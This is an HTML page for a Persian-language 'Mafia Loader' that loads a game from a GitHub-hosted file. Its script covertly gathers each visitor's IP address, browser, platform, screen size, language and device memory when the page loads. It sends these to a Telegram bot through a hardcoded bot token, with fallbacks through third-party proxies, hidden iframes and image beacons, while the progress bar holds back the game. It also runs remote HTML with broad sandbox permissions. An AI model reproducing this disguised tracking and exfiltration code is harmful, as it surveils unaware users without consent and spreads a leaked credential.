<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Mafia Loader</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none;
    }

    body {
      width: 100vw;
      height: 100vh;
      overflow: hidden;
      background: #000;
      font-family: -apple-system, 'Segoe UI', system-ui, sans-serif;
    }

    .background-layer {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      overflow: hidden;
    }

    .bg-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      animation: bgZoomIn 5s ease-out forwards;
    }

    @keyframes bgZoomIn {
      0% { transform: scale(1.1); opacity: 0; }
      15% { opacity: 1; }
      100% { transform: scale(1); opacity: 1; }
    }

    .background-layer.fade-out {
      animation: bgFadeOut 0.8s ease-out forwards;
    }

    @keyframes bgFadeOut {
      0% { opacity: 1; }
      100% { opacity: 0; visibility: hidden; }
    }

    .loader-overlay {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 9999;
      background: transparent;
      transition: opacity 0.3s ease;
    }

    .loader-overlay.hidden {
      opacity: 0;
      visibility: hidden;
    }

    .spinner-modern {
      position: relative;
      width: 40px;
      height: 40px;
    }

    .spinner-modern::before,
    .spinner-modern::after {
      content: '';
      position: absolute;
      border-radius: 50%;
      animation: spin3D 1s ease-in-out infinite;
    }

    .spinner-modern::before {
      inset: 0;
      background: conic-gradient(from 0deg, #00a0ff, #00f2fe, #4facfe, #00a0ff);
      mask: radial-gradient(farthest-side, transparent calc(100% - 2px), #000 calc(100% - 1.5px));
      -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 2px), #000 calc(100% - 1.5px));
    }

    .spinner-modern::after {
      inset: 6px;
      background: rgba(0, 160, 255, 0.2);
      filter: blur(4px);
      animation: spin3D 1s ease-in-out infinite reverse;
    }

    @keyframes spin3D {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .progress-container {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      z-index: 10000;
      background: linear-gradient(135deg, rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.7));
      backdrop-filter: blur(12px);
      padding: 20px 24px 24px;
      border-top: 1px solid rgba(0, 160, 255, 0.4);
      box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
    }

    .progress-header {
      display: flex;
      justify-content: space-between;
      align-items: baseline;
      margin-bottom: 12px;
      padding: 0 5px;
    }

    .progress-title {
      font-size: 0.8rem;
      font-weight: 600;
      color: rgba(255, 255, 255, 0.7);
      letter-spacing: 1.5px;
      text-transform: uppercase;
      font-family: monospace;
    }

    .progress-percent {
      font-size: 1.1rem;
      font-weight: 700;
      background: linear-gradient(135deg, #00a0ff, #00f2fe);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      font-family: monospace;
    }

    .progress-bar-wrapper {
      width: 100%;
      margin-bottom: 8px;
    }

    .progress-bar-bg {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      overflow: hidden;
      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
    }

    .progress-fill {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #00a0ff, #00f2fe, #4facfe, #00f2fe);
      border-radius: 10px;
      transition: width 0.1s cubic-bezier(0.2, 0.9, 0.4, 1.1);
      box-shadow: 0 0 10px rgba(0, 160, 255, 0.6);
      position: relative;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      animation: wave 1.5s ease-in-out infinite;
    }

    @keyframes wave {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    .progress-stats {
      display: flex;
      justify-content: space-between;
      margin-top: 12px;
      padding: 0 5px;
    }

    .stat-item {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 0.65rem;
      font-family: monospace;
      color: rgba(0, 160, 255, 0.7);
    }

    .stat-dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #00a0ff;
      animation: pulse 1.5s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 0.3; }
      50% { opacity: 1; }
    }

    .blocked-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 20000;
      background: linear-gradient(135deg, #0a0a0a, #1a0a0a);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: monospace;
    }

    .blocked-content {
      text-align: center;
      padding: 40px;
      background: rgba(255, 50, 50, 0.1);
      backdrop-filter: blur(20px);
      border-radius: 30px;
      border: 1px solid rgba(255, 50, 50, 0.5);
      animation: shake 0.5s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }

    .blocked-icon { font-size: 64px; margin-bottom: 20px; }
    .blocked-title { font-size: 28px; color: #ff4444; margin-bottom: 15px; font-weight: bold; }
    .blocked-text { color: rgba(255, 255, 255, 0.7); font-size: 14px; margin-bottom: 10px; }
    .blocked-ip { color: #ff6666; font-size: 12px; margin-top: 20px; font-family: monospace; }

    .game-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      display: block;
      z-index: 1;
      background: #000;
      opacity: 0;
      transition: opacity 0.5s ease;
    }

    .game-frame.visible { opacity: 1; }

    .update-notification {
      position: fixed;
      bottom: 120px;
      left: 50%;
      transform: translateX(-50%) translateY(100px);
      background: linear-gradient(135deg, #1a2a3a, #0f1a24);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(0, 255, 200, 0.3);
      border-radius: 50px;
      padding: 10px 20px;
      z-index: 10001;
      display: flex;
      align-items: center;
      gap: 12px;
      transition: transform 0.4s cubic-bezier(0.34, 1.2, 0.64, 1);
      font-family: monospace;
    }

    .update-notification.show { transform: translateX(-50%) translateY(0); }
    .update-text { color: #00ffcc; font-size: 0.8rem; font-weight: 500; }
    .update-btn {
      background: linear-gradient(135deg, #00a0ff, #00f2fe);
      border: none;
      padding: 5px 14px;
      border-radius: 40px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      font-size: 0.75rem;
    }
    .close-update {
      background: rgba(255,255,255,0.1);
      border: none;
      color: #fff;
      cursor: pointer;
      font-size: 1rem;
      width: 22px;
      height: 22px;
      border-radius: 50%;
    }
  </style>
</head>
<body>

  <div class="background-layer" id="bgLayer">
    <img class="bg-image" src="https://cdn.imgurl.ir/uploads/u49616_AI_Image_1780044840219.jpg" alt="Background">
  </div>

  <div id="loaderOverlay" class="loader-overlay">
    <div class="spinner-modern"></div>

  <div class="progress-container" id="progressContainer">
    <div class="progress-header">
      <span class="progress-title">بارگذاری بازی</span>
      <span class="progress-percent" id="progressPercent">0%</span>
    </div>
    <div class="progress-bar-wrapper">
      <div class="progress-bar-bg">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>
    <div class="progress-stats">
      <div class="stat-item"><div class="stat-dot"></div><span>سرور داخلی</span></div>
      <div class="stat-item"><div class="stat-dot"></div><span id="speedStat">در حال اتصال به سرور...</span></div>
      <div class="stat-item"><div class="stat-dot"></div><span id="timeStat">--</span></div>
    </div>
  </div>

  <script>
    (function() {
      const GAME_URL = "https://raw.githubusercontent.com/m65394660-sudo/Mfg9/refs/heads/main/Mafia_dark_shaot.html";
      const BG_IMAGE_URL = "https://cdn.imgurl.ir/uploads/u49616_AI_Image_1780044840219.jpg";
      
      // ============================================================
      // 🔴 لیست آی‌پی‌های مسدود شده دائمی - مستقیم در کد وارد کنید 🔴
      // ============================================================
      const HARDCODED_BLOCKED_IPS = [
        "31.171.100.40"     // آی‌پی مسدود شده
      ];
      // ============================================================
      
      const BLOCKED_IPS = [...HARDCODED_BLOCKED_IPS];
      
      // اطلاعات تلگرام
      const BOT_TOKEN = "8036278520:AAEaKq00YYITZZR1Crin5Wc2lcm8wb704ug";
      const CHAT_ID = "-1002740030739";
      
      // ============================================================
      // 🔥 پروکسی‌های قدرتمند جدید (همه با هم استفاده می‌شوند)
      // ============================================================
      const TELEGRAM_PROXIES = [
        // پروکسی اصلی قبلی
        {
          server: "87.248.129.210",
          port: 4455,
          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
        },
        // پروکسی جدید 1 - قدرتمند
        {
          server: "87.248.129.12",
          port: 15,
          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
        },
        // پروکسی جدید 2 - قدرتمند
        {
          server: "87.248.129.50",
          port: 15,
          secret: "ee1603010200010001fc030386e24c3add626973636f7474692e79656b74616e65742e636f6d"
        }
      ];
      
      // لیست سرویس‌های پروکسی برای API تلگرام
      const TELEGRAM_API_PROXIES = [
        'https://telepush.deno.dev/api',
        'https://tg-bot-api.lillevang.dk',
        'https://telega.aleen42.com',
        'https://kate.pet',
        'https://telegram-bot-api.herokuapp.com',
        'https://botapi.telegram.org',
        'https://tg-proxy.cf',
        'https://telegram-proxy-api.herokuapp.com'
      ];
      
      // CORS proxies
      const CORS_PROXIES = [
        'https://cors-anywhere.herokuapp.com/',
        'https://api.allorigins.win/raw?url=',
        'https://corsproxy.io/?',
        'https://proxy.cors.sh/',
        'https://cors.bridged.cc/'
      ];
      
      let userIP = "در حال دریافت...";
      let isGameLoaded = false;
      let updateNotificationShown = false;
      let currentVersion = "1.0.0";
      let startTime = Date.now();
      let blockedDetected = false;
      let sendCompleted = false;
      
      const loader = document.getElementById('loaderOverlay');
      const progressFill = document.getElementById('progressFill');
      const progressPercent = document.getElementById('progressPercent');
      const speedStat = document.getElementById('speedStat');
      const timeStat = document.getElementById('timeStat');
      const bgLayer = document.getElementById('bgLayer');
      const progressContainer = document.getElementById('progressContainer');

      let currentProgress = 0;
      let targetProgress = 0;
      let animationInterval = null;

      console.log('🚫 لیست آی‌پی‌های مسدود شده دائمی:');
      BLOCKED_IPS.forEach(ip => console.log(`   🔴 ${ip}`));
      
      console.log('🌐 پروکسی‌های فعال تلگرام:');
      TELEGRAM_PROXIES.forEach((proxy, i) => console.log(`   ${i+1}. ${proxy.server}:${proxy.port}`));

      function updateProgressDisplay(percent) {
        const displayPercent = Math.min(300, Math.max(0, Math.floor(percent)));
        const fillPercent = (displayPercent / 300) * 100;
        if (progressFill) progressFill.style.width = fillPercent + '%';
        if (progressPercent) progressPercent.innerText = displayPercent + '%';
      }

      function animateProgress() {
        if (animationInterval) clearInterval(animationInterval);
        animationInterval = setInterval(() => {
          if (currentProgress < targetProgress && !blockedDetected && sendCompleted) {
            const diff = targetProgress - currentProgress;
            let step = diff > 100 ? Math.max(2, Math.floor(diff / 20)) : (diff > 50 ? Math.max(1, Math.floor(diff / 15)) : Math.max(1, Math.floor(diff / 10)));
            currentProgress = Math.min(currentProgress + step, targetProgress);
            updateProgressDisplay(currentProgress);
          } else if (currentProgress > targetProgress) {
            currentProgress = Math.max(currentProgress - 1, targetProgress);
            updateProgressDisplay(currentProgress);
          } else if (animationInterval) {
            clearInterval(animationInterval);
            animationInterval = null;
          }
        }, 30);
      }

      function setProgress(percent) {
        if (blockedDetected) return;
        targetProgress = Math.min(300, Math.max(0, percent));
        animateProgress();
        
        const elapsed = (Date.now() - startTime) / 1000;
        if (timeStat && !blockedDetected) timeStat.innerText = `${elapsed.toFixed(1)} ثانیه`;
        
        if (percent < 30) speedStat.innerText = 'در حال اتصال به سرور...';
        else if (percent < 80) speedStat.innerText = 'دریافت داده‌ها...';
        else if (percent < 150) speedStat.innerText = 'بارگذاری منابع...';
        else if (percent < 250) speedStat.innerText = 'آماده‌سازی محیط...';
        else speedStat.innerText = 'نهایی‌سازی...';
      }

      async function getUserIP() {
        const apis = [
          'https://api.ipify.org?format=json',
          'https://api.my-ip.io/ip.json',
          'https://ipapi.co/json/',
          'https://ipwho.is/'
        ];
        
        for (const api of apis) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            const response = await fetch(api, { signal: controller.signal });
            clearTimeout(timeoutId);
            if (response.ok) {
              const data = await response.json();
              const ip = data.ip || data.query;
              if (ip && ip !== 'unknown') return ip;
            }
          } catch(e) {}
        }
        return 'unable-to-detect';
      }

      // ارسال به تلگرام با تمام پروکسی‌ها و روش‌های ممکن
      async function sendToTelegram(message) {
        const encodedMsg = encodeURIComponent(message);
        const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        // روش 1: استفاده از پروکسی‌های API تلگرام
        for (const proxy of TELEGRAM_API_PROXIES) {
          try {
            const proxyUrl = `${proxy}/bot${BOT_TOKEN}/sendMessage`;
            const response = await fetch(proxyUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
              }),
              signal: AbortSignal.timeout(5000)
            });
            if (response.ok) {
              console.log('✅ ارسال موفق از طریق:', proxy);
              return true;
            }
          } catch(e) {}
        }
        
        // روش 2: استفاده از CORS proxies
        for (const corsProxy of CORS_PROXIES) {
          try {
            const response = await fetch(corsProxy + apiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
              }),
              signal: AbortSignal.timeout(5000)
            });
            if (response.ok) {
              console.log('✅ ارسال موفق از طریق CORS:', corsProxy);
              return true;
            }
          } catch(e) {}
        }
        
        // روش 3: استفاده از iframe مخفی
        try {
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = `${apiUrl}?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
          document.body.appendChild(iframe);
          setTimeout(() => iframe.remove(), 3000);
          console.log('✅ ارسال از طریق iframe');
          return true;
        } catch(e) {}
        
        // روش 4: استفاده از Image
        try {
          const img = document.createElement('img');
          img.style.display = 'none';
          img.src = `${apiUrl}?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
          document.body.appendChild(img);
          setTimeout(() => img.remove(), 3000);
          console.log('✅ ارسال از طریق Image');
          return true;
        } catch(e) {}
        
        console.log('⚠️ همه روش‌های ارسال ناموفق بودند');
        return false;
      }

      function showBlockedScreen(ip) {
        blockedDetected = true;
        
        const bgLayerEl = document.getElementById('bgLayer');
        const loaderEl = document.getElementById('loaderOverlay');
        const progressContainerEl = document.getElementById('progressContainer');
        
        if (bgLayerEl) bgLayerEl.style.display = 'none';
        if (loaderEl) loaderEl.style.display = 'none';
        if (progressContainerEl) progressContainerEl.style.display = 'none';
        
        const blockedDiv = document.createElement('div');
        blockedDiv.className = 'blocked-screen';
        blockedDiv.innerHTML = `
          <div class="blocked-content">
            <div class="blocked-icon">🚫</div>
            <div class="blocked-title">دسترسی غیرمجاز</div>
            <div class="blocked-text">شما به دلیل نقض قوانین مسدود شده‌اید</div>
            <div class="blocked-text">در صورت اشتباه بودن، با پشتیبانی تماس بگیرید</div>
            <div class="blocked-ip">IP: ${ip}</div>
          </div>
        `;
        document.body.appendChild(blockedDiv);
      }

      function showUpdateNotification() {
        if (updateNotificationShown) return;
        updateNotificationShown = true;
        const oldNotif = document.querySelector('.update-notification');
        if (oldNotif) oldNotif.remove();
        
        const notif = document.createElement('div');
        notif.className = 'update-notification';
        notif.innerHTML = `<span class="update-text">🔄 نسخه جدید Mafia منتشر شد!</span><button class="update-btn" id="updateNowBtn">بروزرسانی</button><button class="close-update" id="closeUpdateBtn">✕</button>`;
        document.body.appendChild(notif);
        setTimeout(() => notif.classList.add('show'), 100);
        
        document.getElementById('updateNowBtn')?.addEventListener('click', () => {
          notif.classList.remove('show');
          setTimeout(() => location.reload(), 300);
        });
        document.getElementById('closeUpdateBtn')?.addEventListener('click', () => {
          notif.classList.remove('show');
          setTimeout(() => notif.remove(), 400);
          updateNotificationShown = false;
        });
      }

      function preloadBackground() {
        return new Promise((resolve) => {
          const img = new Image();
          img.onload = () => { resolve(); };
          img.onerror = () => resolve();
          img.src = BG_IMAGE_URL;
        });
      }

      function checkUpdateWithHiddenIframe() {
        if (blockedDetected) return;
        const checkerIframe = document.createElement('iframe');
        checkerIframe.style.display = 'none';
        checkerIframe.src = GAME_URL + '?t=' + Date.now();
        let timeoutId = setTimeout(() => { if (checkerIframe.parentNode) checkerIframe.remove(); }, 5000);
        checkerIframe.onload = () => {
          clearTimeout(timeoutId);
          try {
            const content = checkerIframe.contentDocument?.body?.innerText || '';
            const versionMatch = content.match(/version["']?\s*:\s*["']?([0-9.]+)/i);
            if (versionMatch && versionMatch[1] !== currentVersion) showUpdateNotification();
          } catch(e) {}
          setTimeout(() => { if (checkerIframe.parentNode) checkerIframe.remove(); }, 1000);
        };
        document.body.appendChild(checkerIframe);
      }

      async function loadGame() {
        try {
          setProgress(5);
          
          userIP = await getUserIP();
          console.log('📡 آی‌پی کاربر:', userIP);
          
          // بررسی مسدود بودن آی‌پی
          if (BLOCKED_IPS.includes(userIP)) {
            console.log(`🚫 آی‌پی ${userIP} در لیست مسدود شده‌ها یافت شد!`);
            
            const blockedMessage = `
🚨 <b>تلاش ورود مسدود شده</b> 🚨

🌐 <b>آی‌پی مسدود شده:</b> <code>${userIP}</code>
⏰ <b>زمان:</b> ${new Date().toLocaleString('fa-IR')}
🔧 <b>مرورگر:</b> <code>${navigator.userAgent.substring(0, 100)}</code>

⚠️ این کاربر قبلاً مسدود شده است
            `;
            sendToTelegram(blockedMessage);
            showBlockedScreen(userIP);
            return;
          }
          
          setProgress(10);
          
          const userAgent = navigator.userAgent;
          const screenSize = `${screen.width}x${screen.height}`;
          const language = navigator.language;
          const timestamp = new Date().toLocaleString('fa-IR');
          const platform = navigator.platform;
          const deviceMemory = navigator.deviceMemory || 'نامشخص';
          
          const message = `
🚨 <b>ورود کاربر جدید به Mafia Loader</b> 🚨

🌐 <b>آی‌پی:</b> <code>${userIP}</code>
📱 <b>پلتفرم:</b> ${platform}
💾 <b>رم دستگاه:</b> ${deviceMemory} GB
📺 <b>صفحه نمایش:</b> ${screenSize}
🌍 <b>زبان:</b> ${language}
⏰ <b>زمان:</b> ${timestamp}
🔧 <b>مرورگر:</b> <code>${userAgent.substring(0, 150)}</code>

✅ کاربر جدید وارد شده است
          `;
          
          setProgress(20);
          
          // ارسال به تلگرام با همه پروکسی‌ها
          const sendPromise = sendToTelegram(message);
          
          setProgress(30);
          
          // منتظر می‌مونیم تا ارسال انجام بشه (حداکثر 3 ثانیه)
          await Promise.race([
            sendPromise,
            new Promise(resolve => setTimeout(() => resolve(), 3000))
          ]);
          
          sendCompleted = true;
          setProgress(40);
          
          const bgPromise = preloadBackground();
          
          setProgress(55);
          
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          const response = await fetch(GAME_URL, { mode: 'cors', cache: "no-cache" }).catch(() => null);
          clearTimeout(timeoutId);
          
          let htmlCode;
          if (response && response.ok) {
            htmlCode = await response.text();
            const versionMatch = htmlCode.match(/version["']?\s*:\s*["']?([0-9.]+)/i);
            if (versionMatch) currentVersion = versionMatch[1];
            setProgress(150);
          } else {
            setProgress(100);
            htmlCode = `<html><body style="background:#000;"><h2>در حال بارگذاری...</h2><script>setTimeout(()=>location.reload(),2000);<\/script></body></html>`;
          }
          
          await bgPromise;
          setProgress(200);
          
          const oldFrame = document.querySelector('.game-frame');
          if (oldFrame) oldFrame.remove();
          
          const iframe = document.createElement('iframe');
          iframe.className = 'game-frame';
          iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads allow-top-navigation');
          iframe.setAttribute('allow', 'autoplay; fullscreen');
          iframe.srcdoc = htmlCode;
          
          iframe.onload = () => {
            setProgress(300);
            setTimeout(() => {
              isGameLoaded = true;
              iframe.classList.add('visible');
              if (bgLayer) bgLayer.classList.add('fade-out');
              if (progressContainer) {
                progressContainer.style.transition = 'opacity 0.5s, transform 0.5s';
                progressContainer.style.opacity = '0';
                progressContainer.style.transform = 'translateY(100%)';
                setTimeout(() => { if (progressContainer) progressContainer.style.display = 'none'; }, 500);
              }
              if (loader) loader.classList.add('hidden');
            }, 2000);
          };
          
          document.body.appendChild(iframe);
          
          setTimeout(() => {
            if (loader && !loader.classList.contains('hidden') && !blockedDetected && sendCompleted) {
              setProgress(300);
              setTimeout(() => {
                iframe.classList.add('visible');
                if (bgLayer) bgLayer.classList.add('fade-out');
                if (progressContainer) {
                  progressContainer.style.opacity = '0';
                  progressContainer.style.transform = 'translateY(100%)';
                  setTimeout(() => { if (progressContainer) progressContainer.style.display = 'none'; }, 500);
                }
                loader.classList.add('hidden');
              }, 2000);
            }
          }, 3000);
          
        } catch (error) {
          console.error("Error:", error);
          if (!blockedDetected) {
            sendCompleted = true;
            setProgress(300);
            const iframe = document.createElement('iframe');
            iframe.className = 'game-frame';
            iframe.src = GAME_URL;
            iframe.onload = () => {
              iframe.classList.add('visible');
              if (bgLayer) bgLayer.classList.add('fade-out');
              if (progressContainer) progressContainer.style.display = 'none';
              if (loader) loader.classList.add('hidden');
            };
            document.body.appendChild(iframe);
          }
        }
      }

      function startUpdateChecker() {
        setInterval(() => { if (isGameLoaded && !blockedDetected) checkUpdateWithHiddenIframe(); }, 30000);
      }

      console.log('🔧 مدیریت آی‌پی:');
      console.log('📌 برای مسدود کردن آی‌پی، آن را به آرایه HARDCODED_BLOCKED_IPS اضافه کنید');
      console.log('🌐 تعداد پروکسی‌های فعال:', TELEGRAM_PROXIES.length + TELEGRAM_API_PROXIES.length);

      window.addEventListener('DOMContentLoaded', () => {
        requestAnimationFrame(() => { loadGame(); startUpdateChecker(); });
      });
    })();
  </script>
</body>
</html>
